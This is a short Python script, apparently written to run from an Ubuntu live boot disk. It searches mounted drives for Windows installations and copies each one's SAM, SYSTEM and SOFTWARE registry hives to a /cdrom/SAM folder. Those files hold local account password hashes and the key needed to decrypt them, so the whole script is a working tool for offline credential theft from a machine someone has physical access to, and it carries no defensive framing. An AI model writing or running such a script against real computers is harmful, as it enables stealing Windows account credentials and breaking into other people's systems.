import shutil
import os

def main():
	dirs=os.listdir("/media/ubuntu/")
	
	for x in range(0, len(dirs)):
		path="/media/ubuntu/"+str(dirs[x])+"/Windows/System32/config"
		if os.path.exists(path):
			if os.path.exists("/cdrom/SAM/")==False:
				os.mkdir("/cdrom/SAM/")
				
			shutil.copy(path+"/SAM", "/cdrom/SAM/SAM")
			shutil.copy(path+"/SYSTEM", "/cdrom/SAM/SYSTEM")
			shutil.copy(path+"/SOFTWARE", "/cdrom/SAM/SOFTWARE")

if __name__=="__main__":
	main()